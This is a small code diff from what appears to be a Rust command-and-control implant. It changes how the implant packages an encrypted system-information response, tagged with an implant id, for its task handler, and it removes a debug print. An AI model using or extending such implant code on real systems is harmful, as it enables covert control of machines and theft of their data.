@@ -61,7 +61,6 @@ pub fn handle_available_tasks(
 
     // Check if tasks response is empty array
     if deserialized_tasks.is_empty() {
-        println!("I am in empty tasks");
         return Ok(());
     }
 
@@ -76,7 +75,6 @@ pub fn handle_available_tasks(
                 let task_id = task.task_id.to_string();
                 let encrypted_response =
                     build_encrypted_response(&blake3_hashed_key, system_info, implant_id);
-
                 result::send_task(&task_id, encrypted_response);
             }
             _ => process::exit(1),
@@ -121,12 +119,9 @@ where
     // Base64 encode nonce
     let base64_nonce = base64::encode(nonce);
 
-    // Base64 encode implant id
-    let base64_implant_id = base64::encode(implant_id);
-
     let response = format!(
         "{}\n{}\n{}",
-        base64_encrypted_message, base64_nonce, base64_implant_id
+        base64_encrypted_message, base64_nonce, implant_id
     );
 
     response
